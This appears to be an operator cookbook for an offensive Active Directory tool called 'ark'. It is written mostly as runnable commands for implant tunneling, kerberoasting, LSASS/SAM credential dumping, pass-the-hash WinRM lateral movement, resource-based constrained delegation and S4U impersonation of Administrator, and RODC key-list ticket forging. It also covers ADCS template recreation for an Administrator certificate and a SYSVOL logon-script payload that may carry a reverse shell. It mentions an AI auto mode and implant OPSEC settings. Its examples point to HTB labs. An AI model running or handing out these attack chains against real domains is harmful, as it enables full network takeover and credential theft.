# AD engagement cookbook (Sprint 1–2)

Focused **internal AD post-ex** path. Not an MSF replacement.

**Fill-the-skeleton plan:** `docs/plans/FILL_AD_SKELETON.md` (inbound first, then host AD brain, lean C).

## 0. Inbound first (every eng)

If the box cannot reach your VPN, or you cannot reach the DC from the operator host, **do this before LDAP/SMB/Kerberos**.

```bash
ark inbound status
ark inbound drop user@TARGET               # post-foothold: tunnel + generate (secret in DB)
# after implant session:
ark inbound through --probe DC:389
eval "$(ark inbound env --port 1080)"      # ALL_PROXY for host ldap/smb/ad/kerberos
ark ldap bind --dc DC --domain DOM --user u --pass-file p
```

Host tools honor `ARK_PROXY` / `ALL_PROXY` (SOCKS5). Full checklist: `docs/OPERATOR_INBOUND.md`.

## Sprint 1 path (golden)

```
foothold (implant)
  → recon (whoami, ifconfig, processes)
  → ldap_enum kerberoastable
  → kerberoast
  → mission_complete / summarize
```

Approvals: `ldap_enum`, `kerberoast` (high).

## Soft-compromise path (Support / Logging style)

```
# Host-side first when WinRM is filtered / no implant yet:
ark smb shares --host DC --anon
ark ldap enum --dc DC --domain DOM --user u --pass-file p --type interesting
ark ldap enum --dc DC --domain DOM --user u --pass-file p --type acl
ark ldap dangling --dc DC --domain DOM --user u --pass-file p
ark kerberos asktgt --dc DC --domain DOM --user u --pass-file p
ark kerberos ticket import ./admin.ccache
ark ldap bind --dc DC --domain DOM --ticket <id>
ark ldap set --dc DC --domain DOM --user u --pass-file p --target bob scriptPath loot.bat --yes
ark ad add-computer --dc DC --domain DOM --user u --pass-file p --name ATTACK --out ./mach.pass --yes

foothold (implant)
  → recon
  → smb list_shares / list_dir / download (anon or creds)
  → ldap_enum interesting (+ kerberoastable) with password or ntlm_hash
  → lateral winrm <target> <cmd> --user u --pass p   # or --hash <NT>
  → summarize (no DA abuse unless objective requires)
```

Approvals: `smb`, `ldap_enum`, `lateral_move` (high/critical).

## Hard identity path (Garfield-class) — Sprint B+

```
kerberos skew --dc <DC>                    # preflight (fail loud if |skew| > 5m)
soft: smb write SYSVOL/NETLOGON + ldap set scriptPath (recipe)
  → interactive logon bot runs script → ForceChangePassword / marker
  → lateral winrm as privileged user
  → ad add-computer + ark rbcd write --to HOST$ --from ATTACK$ --yes
  → ark kerberos s4u --user ATTACK$ --pass-file ./mach.pass \
        --impersonate Administrator --spn cifs/dc.domain.htb \
        [--altservice CIFS/other]
  → ark smb ls --host HOST --share C$ --ticket <id>   # native Kerberos SMB
  → ark ldap bind --dc DC --domain DOM --ticket <id>   # GSSAPI; internal ClockOffset, no faketime
  → ark kerberos keylist --dc DC --domain D --user Administrator \
        --rodc-no N --aes-file ./rodc.aes                 # RODC TGT forge + KERB-KEY-LIST
  → lateral winrm --hash
```

Full plan: `docs/plans/SPRINT_B_AD.md`. KeyList / RBCD write are **critical** approvals.

### Logon-script staging recipe (operator)

1. Confirm ACL: writable `scriptPath` on target user (or use `ldap-enum` / bloodyAD until B.8 ships).
2. Write payload to `\\<dc>\SYSVOL\<domain>\scripts\` (or NETLOGON) — e.g. ADSI ForceChangePassword + marker file + optional reverse shell.
3. Set `scriptPath` to the script name (relative to NETLOGON).
4. Wait for **interactive** logon (HTB bot); network/WinRM logon does **not** run logon scripts.
5. Detect success via marker on SYSVOL/Public, HTTP beacon, or new password WinRM.
6. Cleanup: restore original `scriptPath` and script content when done.

See also: `reports/htb-garfield/PROGRESS.md`.

## Sprint 2 path (job-complete)

```
… golden path …
  → creds_dump lsass|sam (approve)
  → lateral_move winrm|wmi to one host (approve)
  → socks_start (optional)
  → summarize loot
```

## Operator commands (quick)

```text
sessions
use <id>
shell whoami
ifconfig
smb list_shares --host 10.10.10.10 --anon
smb list_dir --host 10.10.10.10 --share support-tools --anon
smb download --host 10.10.10.10 --share Logs --path IdentitySync_Trace.log --user u --pass p
kerberos skew --dc dc.dom.local
ldap-enum interesting --domain DOM --dc dc.dom.local --user u --pass p
ldap-enum kerberoastable --domain DOM --dc dc.dom.local --hash <NT>
pending / approve <id>
kerberoast --domain DOM --dc dc.dom.local --user u --pass p
creds-dump lsass
lateral winrm <target> <cmd> --user u --pass p
lateral winrm <target> <cmd> --user u --hash <NThash> --domain DOM
loot
# Host-side (no session): ark ad password --dc DC --domain D --user U --pass-file P --target T --new-pass-file N
# Host-side writes: ldap set scriptPath | ad add-computer | rbcd write
#                   kerberos s4u | kerberos keylist (B.9 landing)
```

### Dangling ADCS templates (DanglingTree)

CA `certificateTemplates` may list names whose AD objects were deleted. Recreating the **same published name** as schema-v1 ESC1 (enrollee supplies subject + Client Auth) is enough — no ManageCA / enable-template.

- Do **not** copy the built-in `User` `nTSecurityDescriptor` at create time (locks the object to EA/DA).
- Creator-owner can then grant Enroll / GenericAll.
- Always request with UPN **and** object SID (`-500` for Administrator).
- Check `kerberos skew --dc` before PKINIT (DanglingTree was +7h).

`ark ldap dangling` (or `ark adcs dangling`) lists published-minus-existing names. Template create / grant / WCCE req:

```bash
ark adcs auto --dc DC --domain DOM --user u --pass-file ./p \
  --name VPNUserTemplate --ca CA-NAME \
  --upn administrator@DOM --sid S-1-5-21-…-500 --out admin.pfx --yes
```

Native PKINIT UnPAC (`ark kerberos pkinit`) is **not** assembled — last hop stays Certipy (Sprint E remainder).

## AI

```text
ai
# Plan → Auto
# Frozen objective in docs/GOLDEN_DEMO.md
```

## OPSEC

- Prefer `generate --language c` (empty language defaults to C) on **both** OS  
- Linux: `generate --os linux --language c` or `ark inbound drop` (registers HMAC). Go Linux is archived.  
- Interactive eng: `--sleep 500`  
- Production: higher sleep + jitter  
